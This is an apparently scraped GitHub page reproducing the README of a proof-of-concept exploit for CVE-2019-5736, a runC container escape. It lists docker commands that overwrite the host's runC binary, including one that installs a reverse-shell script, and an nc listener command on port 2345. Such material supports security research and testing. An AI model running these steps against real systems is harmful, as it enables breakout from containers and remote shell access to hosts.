# POC-CVE-2019-5736

null

| Infos    | Value                                                              |
| -------- | -------------------------------------------------------------------|
| Username | [https://github.com/BBRathnayaka](https://github.com/BBRathnayaka) |
| Url      | [https://github.com/BBRathnayaka/POC-CVE-2019-5736](https://github.com/BBRathnayaka/POC-CVE-2019-5736)                                               |
| Stars    | 0                                                          |
| License  | No License                                                        |

<details>

<summary>Topic / Tags</summary>



</details>

## Readme


<h2 align="center">RunC-CVE-2019-5736</h2>

<p align="center">
<a href="#"><img src="https://img.shields.io/badge/BBR-DevOps-blueviolet" alt="Build Status"></a>
<a href="https://www.idealhax.blogspot.com"><img src="https://img.shields.io/badge/BBR-Blog-blue" alt="Build Status"></a>
<a href="https://www.linkedin.com/in/bbr/"><img src="https://img.shields.io/badge/BBR-LinkedIn-orange" alt="Build Status"></a>
<a href="https://twitter.com/RMBRathnayaka"><img src="https://img.shields.io/badge/BBR-Twitter-ff69b4" alt="Build Status"></a>
<a href="https://www.facebook.com/95bbr"><img src="https://img.shields.io/badge/BBR-FB-success" alt="Build Status"></a>
</p>

---
**Video**: https://bit.ly/2WqvILb

**Blog Post**: <a href="https://idealhax.blogspot.com/2020/05/breaking-out-of-docker-via-runc.html">[www.idealhax.blogspot.com/2020/05/breaking-out-of-docker-via-runc.html]</a>

Here, I like to mention that the original developer of this exploit is Yuval Avrahami at Twistlock Labs.

## Running the POCs
Note that running the POCs will overwrite the runC binary on the host. 

It is highly recommened that you create a copy of your runC binary (normally at /usr/sbin/runc) before running one of the POCs.

Clone the repository:
```sh
$ git clone git@github.com:BBRathnayaka/RunC-CVE-2019-5736.git
```

### Exec POC
Overwrites runc with a simple program that prints a string.

Running the exec POC:
```sh
$ docker build -t cve-2019-5736:exec_POC ./RunC-CVE-2019-5736/exec_POC
$ docker run -d --rm --name poc_ctr cve-2019-5736:exec_POC
$ docker exec poc_ctr bash
```
### Malicious Image POC
Overwrites runc with a simple reverse shell bash script that connects to localhost:2345.

Listen for the reverse shell:
```sh
$ nc -nvlp 2345
```

From a different shell, run the malicious image POC:
```sh
$ docker build -t cve-2019-5736:malicious_image_POC ./RunC-CVE-2019-5736/malicious_image_POC
$ docker run --rm cve-2019-5736:malicious_image_POC
```
#### Reference
```
See [Twistlock Labs](https://www.twistlock.com/labs-blog/breaking-docker-via-runc-explaining-cve-2019-5736/ "Explaining CVE-2019-5763") for an explanation of CVE-2019-5736 and the POCs.

The malicious image POC is heavily based on [q3kâ€™s POC](https://github.com/q3k/cve-2019-5736-poc), so all credit goes to him.
```




## Get the content

```
git clone https://github.com/BBRathnayaka/POC-CVE-2019-5736
cd POC-CVE-2019-5736
```

{% embed url="https://github.com/BBRathnayaka/POC-CVE-2019-5736" %}

<figure><img src="https://avatars.githubusercontent.com/u/36528636?v=4" alt=""><figcaption><p>BBRathnayaka</p></figcaption></figure>
